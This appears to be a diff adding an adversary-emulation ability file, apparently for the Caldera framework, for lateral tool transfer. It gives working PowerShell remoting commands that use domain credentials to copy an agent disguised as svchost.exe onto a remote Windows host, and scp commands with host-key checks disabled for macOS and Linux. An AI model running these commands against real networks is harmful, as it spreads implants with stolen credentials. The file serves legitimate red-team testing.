@@ -1,0 +1,57 @@
+- id: 4908fdc4-74fc-4d7c-8935-26d11ad26a8d
+  name: Copy 54ndc47 (WinRM and SCP)
+  description: Copy 54ndc47 to remote host (powershell 5 or newer only) or SCP
+  tactic: lateral-movement
+  technique:
+    attack_id: T1570
+    name: Lateral Tool Transfer
+  platforms:
+    windows:
+      psh,pwsh:
+        command: |
+          $job = Start-Job -ScriptBlock {
+            $username = "#{domain.user.name}";
+            $password = "#{domain.user.password}";
+            $secstr = New-Object -TypeName System.Security.SecureString;
+            $password.ToCharArray() | ForEach-Object {$secstr.AppendChar($_)};
+            $cred = New-Object -Typename System.Management.Automation.PSCredential -Argumentlist $username, $secstr;
+            $session = New-PSSession -ComputerName "#{remote.host.name}" -Credential $cred;
+            $location = "#{location}";
+            $exe = "#{exe_name}";
+            Copy-Item $location -Destination "C:\Users\Public\svchost.exe" -ToSession $session;
+            Start-Sleep -s 5;
+            Remove-PSSession -Session $session;
+          };
+          Receive-Job -Job $job -Wait;
+        cleanup: |
+          $job = Start-Job -ScriptBlock {
+            $username = "#{domain.user.name}";
+            $password = "#{domain.user.password}";
+            $secstr = New-Object -TypeName System.Security.SecureString;
+            $password.ToCharArray() | ForEach-Object {$secstr.AppendChar($_)};
+            $cred = New-Object -Typename System.Management.Automation.PSCredential -Argumentlist $username, $secstr;
+            $session = New-PSSession -ComputerName "#{remote.host.name}" -Credential $cred;
+            Invoke-Command -Session $session -Command {Remove-Item "C:\Users\Public\svchost.exe" -force};
+            Start-Sleep -s 5;
+            Remove-PSSession -Session $session;
+          };
+          Receive-Job -Job $job -Wait;
+        payloads:
+        - sandcat.go-windows
+    darwin:
+      sh:
+        command: |
+          scp -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o ConnectTimeout=3 sandcat.go-darwin #{remote.ssh.cmd}:~/sandcat.go
+        cleanup: |
+          ssh -o ConnectTimeout=3 #{remote.ssh.cmd} 'rm -f sandcat.go'
+        payloads:
+        - sandcat.go-darwin
+    linux:
+      sh:
+        command: |
+          scp -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o ConnectTimeout=3 sandcat.go-linux #{remote.ssh.cmd}:~/sandcat.go
+        cleanup: |
+          ssh -o ConnectTimeout=3 -o StrictHostKeyChecking=no #{remote.ssh.cmd} 'rm -f sandcat.go'
+        payloads:
+        - sandcat.go-linux
+  singleton: True
